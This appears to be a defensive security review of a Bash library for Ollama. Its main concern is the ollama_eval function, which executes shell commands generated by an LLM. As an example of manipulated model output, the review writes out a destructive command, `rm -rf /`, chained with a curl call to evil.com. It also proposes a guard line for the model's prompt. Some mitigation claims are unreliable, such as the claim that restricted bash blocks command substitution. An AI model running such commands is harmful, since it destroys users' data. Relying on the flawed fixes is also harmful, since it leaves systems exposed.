# Security Review of **Ollama Bash Lib** (`0.44.4`)

> **Goal** – Identify potential security weaknesses, explain how an attacker could exploit them, and provide mitigations that keep the script fully functional on **Bash v3.2 or higher**.

> **Scope** –  
> *All public functions* (API helpers, generation helpers, message helpers, etc.).  
> *Internal plumbing* that touches the network, file system, or user input.

> **Assumptions** – The script is meant to run inside a *trusted* user‑space bash shell.  No root or privileged escalation is expected; the library is *not* a privileged daemon.

> **Disclaimer** – The review does **not** cover the security of the remote Ollama service itself.  It only focuses on the responsibilities of the bash library.

## 1. General Observations

| Category | Observation | Impact |
|----------|-------------|--------|
| **Input validation** | Most arguments are checked against allowed patterns (`_is_valid_json`, `ollama_api_get/post`, `_is_valid_model`). | Good for the endpoints that the library calls. |
| **Command execution** | The only user‑controlled execution is `ollama_eval` which runs code output by the LLM. | Highest risk – a malicious model could produce destructive commands. |
| **Logging** | `debug` messages are sanitized via `_redact`.  `error` messages are not sanitized. | Potential exposure of secrets in error logs if the secret shows up in the message. |
| **Secrets handling** | `OLLAMA_LIB_TURBO_KEY` is only stored in a variable; it is exported only when requested. | No accidental hard‑coding of secrets in the source. |
| **Compatibility** | Uses array syntax (`${ARR[@]}`) and process substitutions (`>(…)`).  These are present in Bash 3.2+, so the script will run unchanged on modern systems. | ✔ |

---

## 2. Detailed Vulnerability Assessment

| # | Function / Feature | What the code does | Security issue | Exploit scenario | Mitigation |
|---|--------------------|--------------------|----------------|------------------|------------|
| 1 | **`ollama_eval`** | Fetches a Bash one‑liner from the LLM, prints it, and executes it in a sandboxed `env -i`. | **Remote code execution** – `cmd` is *any* string generated by the LLM and is evaluated by `bash -c "$cmd"`. | An attacker could provide a prompt that fools the LLM into producing something like: `rm -rf /; curl -s http://evil.com/steal.txt -o /dev/null`. The script would prompt the user “Run command (y/N)?” – a user who clicks *y* will run a destructive command. | • Add a **whitelist** of allowed commands (e.g. `echo`, `grep`, `awk`, `sed`, `cut`, simple arithmetic).  <br>• Replace `bash -c` with a *restricted execution environment* such as `bash --noprofile --norc --restricted` **and** prevent *command substitutions* and *process substitutions* (disallow `$(… )` or backticks). <br>• Consider using **`runc`/`firecracker`** or a Docker container for real isolation. <br>• Use a *prompt‑based* model that is highly unlikely to produce dangerous commands – e.g. set a “no destructive commands” guard in the prompt. |
| 2 | **`ollama_thinking_stream` / `_ollama_thinking_stream`** | Streams output from the LLM and prefixes lines with `#` to stderr. | *No direct security issue* but the function reads only the first character and then dumps the rest. If the first character is a newline the `# <thinking>` tag will appear on a line by itself. | Potential for confusing output but not a security vulnerability. | Minor: rewrite to handle arbitrary line starts: `{ read -r line; printf '# <thinking>\n# %s\n# </thinking>\n' "$line"}`. |
| 3 | **`_is_valid_json`** | Calls `jq -e '.'` on input. | No injection risk, but **return‑code 4 (“No output”)** is treated as success. This means an empty string is *technically* considered valid JSON. | If an attacker somehow makes the API return an empty string, the lib may consider it a valid payload and proceed. | Add `|| return 1` after `jq -e '.'` or treat exit code 4 as failure. |
| 4 | **`_debug`** | Prints timestamped debug lines to **stderr**. | `OLLAMA_LIB_DEBUG` can be set to `2` for *verbose* output; if this is enabled on a machine exposed to an attacker, it could reveal timing data. | Low risk. | Keep `debug` off in production; document the flag. |
| 5 | **`ollama_app_turbo`** | Reads an API key silently from stdin if not present. | The key is never printed, but the script may echo the *full URL* you switch to (`https://ollama.com`). If an attacker can read stdout (e.g., via a terminal logger) they learn the endpoint. | Not a major risk, but may aid reconnaissance. | No mitigation needed; just note that the endpoint is static. |
| 6 | **`ollama_app_vars`** and `ollama_lib_about` | Print many environment variables. | If the user running the script does **not** realize the list includes secrets such as `OLLAMA_AUTH`, they might inadvertently expose them by tweeting the `ollama_lib_about` output. | Very low risk on local consoles, higher if output is captured remotely. | • Mask any variable that contains the substring “AUTH” or “KEY” by printing `*redacted*`. <br>• Optionally provide a `--no-secrets` flag. |
| 7 | **`curl` usage** | Constructs a header `Authorization: Bearer ${OLLAMA_LIB_TURBO_KEY}` and posts JSON payloads. | *Injection* is impossible because args are passed as a separate array element – no shell interpolation occurs. | None. | ✔ |
| 8 | **Command substitution and arrays** | Uses `"${ARR[@]}"` and `${1:0:42}` syntax. | Works in Bash 3.2+. No special risk. | ✔ |
| 9 | **`ollama_generate_json`** | Builds a JSON payload with `jq -c -n --argjson`. | The `--argjson stream "$stream"` expects a JSON literal (`true`/`false`), but the script passes a word‑size string (`true` or `false`). jq will interpret it as a Boolean, so no issue. | ✔ |
| 10 | **`ollama_generate_stream`** | Sub‑process reads each line from `ollama_generate_json` and uses `jq` to extract `.response` and optionally `.thinking`. | No injection. The `while` loop’s `read -r` protects against backticks or other delimiters. | ✔ |
| 11 | **`ollama_model_random`** | Uses `shuf` or `awk` to pick a random line. | If `shuf` is present, it reads all lines into memory – no remote code execution. | ✔ |

## 3. Recommendations

### 3.1. Strengthen `ollama_eval`

| What | Why | How |
|------|-----|-----|
| *Whitelist commands* | Prevent destructive commands from being executed. | Define an array `ALLOWED_CMDS=(echo grep awk sed cut head tail wc sort)`. In the permission prompt, match `$first_word` against this list; if not present, abort. |
| *Disable command & process substitution* | The model can embed `$(…)` or backticks that will run arbitrary code. | Use `bash --restricted` and set the environment variable `PATH` to `/bin:/usr/bin`. In restricted mode, functions and shell built‑ins that execute sub‑shells are disabled (`!`, `$(…)`, backticks). |
| *Sandbox container* | Even restricted bash cannot guarantee no network or file writes. | Invoke `docker run --rm -i --network none` or `firecracker` to run the eval script in a minimal container. |
| *Prompting the model* | Add a line to the prompt: “Never output destructive commands such as `rm`, `dd`, `mkfs`, or any command that modifies the filesystem.” | This reduces model risk without needing a whitelist. |
| *Time‑out* | Prevent long‑running operations. | Use `timeout` wrapper consistently. |
| *Error handling* | The function currently returns exit `0` even if `cmd` fails but syntax‑checked. | Capture `$?` from `bash -c "$cmd"` and return it. |

### 3.2. Protect Logs and Secrets

| What | Why | How |
|------|-----|-----|
| Redact secrets in error logs | `ollama_lib_turbo` can emit an error containing the API key if the key is passed accidentally into a command. | Update `_error` to call `_redact` just like `_debug`. |
| Hide sensitive env vars in `ollama_lib_about` | The user might copy the output to a public pastebin. | Detect variable names containing `AUTH`, `KEY`, or `TOKEN` and replace with `*REDACTED*`. |
| Avoid unneeded environment export | Exposing `OLLAMA_HOST` and `OLLAMA_LIB_API` with insecure values might help an attacker. | Export only when the user explicitly calls `ollama_app_turbo`. |

### 3.3. Validate API Endpoints & Hosts

| Issue | Fix |
|-------|-----|
| `OLLAMA_HOST` can be set to an arbitrary string and is not validated. | Add a function `validate_url()` that ensures the host matches `https?://[A-Za-z0-9\-.:]+` before exporting. |
| No checks for malformed host fragments. | Reject hosts containing `;`, `|`, or other shell metacharacters. |

### 3.4. Handling JSON Empty String

Change `_is_valid_json`:

```bash
_is_valid_json() {
  ...
  if ! jq -e '.' > /dev/null 2>&1; then return 1; fi
}
```

### 3.5. Defensive Coding

- **Use `set -euo pipefail`** in top of the script (or at least `set -euo pipefail` in each function that performs critical logic).  
  *Caveat*: Keep compatibility with Bash 3.2 – `-u` is supported, `-o pipefail` is already used.  
- **Validate array indices** before accessing.  
- **Mark all external variables as local** where possible.

## 4. Bash 3.2 Compatibility Checklist

| Feature | Bash 3.2 Support | Notes |
|---------|------------------|-------|
| Array syntax `${ARR[@]}` | ✓ | Works from Bash 2.0+ |
| Process substitution `>( )` | ✓ | Introduced in 3.0 |
| `read -r -n 1 chunk` | ✓ | `-n` available since 2.0 |
| `return` inside functions | ✓ | Basic |
| Arithmetic with `(( ))` | ✓ | Basic |
| `local` variable declaration | ✓ | Basic |
| `printf` with `%s` | ✓ | Basic |
| `${var:offset:length}` substring | ✓ | Basic |
| `command -v` | ✓ | |
| `timeout` command | **Depends on system** | Not a Bash feature. |

All functions in the library use only constructs that are safe in Bash 3.2.  The only “modern” feature is the `2> >( ... )` process substitution – but this is available since Bash 3.0, so it will work on any system with Bash 3.2 or newer.

---

## 5. Summary

| Category | Rating | Key Take‑aways |
|----------|--------|----------------|
| **Input validation** | *Good* | All public APIs filter or validate arguments appropriately. |
| **Command execution** | *Critical* | `ollama_eval` is the only function that runs arbitrary code. It must be hardened. |
| **Logging** | *Adequate* | Debug logs redact the API key; error logs should adopt the same habit. |
| **Secret handling** | *Safe* | The library never hard‑codes secrets. |
| **Compatibility** | *✔* | Uses only Bash 3.2‑compatible features. |
| **Overall** | *Moderately secure* | Requires a key security improvement: sandboxing `ollama_eval`. |

---

## 6. Final Checklist for Implementation

```ini
# 1. Make sure all secret‑handling paths call _redact
# 2. Add command whitelist to ollama_eval
# 3. Use bash --restricted in the sandboxed exec
# 4. Verify that OLLAMA_HOST passes validate_url()
# 5. Replace _is_valid_json return 4 with error
# 6. Optionally enable a safe mode that disables ollama_eval
# 7. Keep debug flag disabled in production
# 8. Document all changes in the README
```

With these changes the lib will be resilient against the primary attack vector (untrusted LLM output) and will continue to run unchanged on Bash v3.2 or later.  The rest of the library retains its full feature set while adhering to secure coding best practices.
